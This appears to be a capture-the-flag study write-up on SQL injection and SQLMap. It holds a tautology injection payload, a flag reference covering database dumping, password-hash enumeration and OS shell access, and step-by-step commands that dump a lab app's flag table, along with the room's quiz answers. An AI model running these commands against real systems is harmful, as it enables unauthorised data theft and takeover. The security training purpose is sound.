### 🧠 SQL Injection Basics

**What is SQL Injection?**
- When user input is improperly sanitised and directly used in SQL queries.
- Attackers can manipulate input to alter query logic (e.g., `' OR 1=1;-- -`).

**Key Concepts:**
| Concept | Description |
|---------|-------------|
| `AND` | Both conditions must be true |
| `OR` | At least one condition must be true |
| `1=1` | Always true |
| `-- -` | Comments out the rest of the query |

**Task 1 & 2 Answers:**
- Language for database interaction → `SQL`
- Boolean operator for "at least one side true" → `OR`
- Is `1=1` always true? → `YEA`

### 🤖 SQLMap Basics

**What is SQLMap?**
- Automated tool for detecting and exploiting SQL injection flaws.
- Pre‑installed on Kali Linux.

**Installation (if needed):**
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
```

**Basic Help:**
```bash
sqlmap -h          # Basic help
sqlmap -hh         # Advanced help
sqlmap --wizard    # Interactive wizard for beginners
```

### 🛠️ SQLMap Commands Reference

**Target Options:**
| Flag | Description |
|------|-------------|
| `-u URL` | Target URL (GET parameters) |
| `-r FILE` | Read HTTP request from file (POST) |
| `-p PARAM` | Testable parameter(s) |

**Request Options:**
| Flag | Description |
|------|-------------|
| `--data=DATA` | Data string for POST requests |
| `--cookie=COOKIE` | HTTP Cookie header |
| `--random-agent` | Use random User-Agent |
| `--proxy=PROXY` | Use a proxy |
| `--tor` | Use Tor anonymity network |

**Detection Options:**
| Flag | Description |
|------|-------------|
| `--level=LEVEL` | Level of tests (1-5, default 1) |
| `--risk=RISK` | Risk of tests (1-3, default 1) |
| `--technique=TECH` | SQL injection techniques to use (default "BEUSTQ") |

**Enumeration Options:**
| Flag | Description |
|------|-------------|
| `-a, --all` | Retrieve everything |
| `-b, --banner` | Retrieve DBMS banner |
| `--current-user` | Retrieve current user |
| `--current-db` | Retrieve current database |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--columns` | Enumerate columns |
| `--dump` | Dump table entries |
| `--dump-all` | Dump all databases |
| `-D DB` | Select database |
| `-T TBL` | Select table |
| `-C COL` | Select column |
| `--passwords` | Enumerate password hashes |
| `--schema` | Enumerate database schema |

**OS Access Options:**
| Flag | Description |
|------|-------------|
| `--os-shell` | Interactive OS shell |
| `--os-cmd=CMD` | Execute OS command |

**General Options:**
| Flag | Description |
|------|-------------|
| `--batch` | Never ask for user input, use defaults |
| `--flush-session` | Clear session files |
| `--wizard` | Simple wizard interface |

### 📝 Task 3 & 4: Practice Exercises

**GET-based SQL Injection:**
```bash
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D database --tables
sqlmap -u "http://target/page.php?id=1" -D database -T table --dump
```

**POST-based SQL Injection:**
1. Intercept a POST request (e.g., login form) and save to `req.txt`.
2. Run SQLMap:
```bash
sqlmap -r req.txt -p vulnerable_param --dbs
```

**Practical Challenge (Blood Donation App):**
- Target: `http://10.145.145.246`
- Find the vulnerable POST parameter.

**Exploitation Steps:**
```bash
# Find databases
sqlmap -r req.txt --dbs

# Find tables in blood database
sqlmap -r req.txt -D blood --tables

# Dump the flag table
sqlmap -r req.txt -D blood -T flag --dump
```

### 🔑 Key Takeaways
- **SQL Injection** occurs when user input is not sanitised and directly used in SQL queries.
- **SQLMap** automates detection and exploitation – supports GET, POST, cookies, and many DBMS types.
- Use `--level=5` for deeper scanning.
- Use `--batch` to skip interactive prompts.
- Always save POST requests to a file and use `-r`.
- Enumerate step-by-step: databases → tables → columns → dump.
